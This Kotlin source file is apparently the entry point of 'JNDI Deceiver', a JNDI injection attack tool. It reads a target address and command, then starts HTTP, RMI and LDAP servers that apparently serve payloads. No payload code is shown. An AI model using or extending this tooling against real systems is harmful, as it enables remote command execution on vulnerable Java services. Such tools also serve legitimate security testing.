import http.HTTPServer
import ldap.LDAPServer
import util.green
import kotlin.concurrent.thread
import kotlin.system.exitProcess

fun main(args: Array<String>) {
    Options.init(args)

    if (Options.helpMessage) {
        TODO("description of each payload")
        exitProcess(0)
    }

    println("""JNDI Deceiver
        |Address: ${Options.address.green()}
        |Command: ${Options.command.green()}
        |
    """.trimMargin())

    // startup all servers
    thread { HTTPServer().run() }
    thread { RMIServer().run() }
    thread { LDAPServer().run() }
}
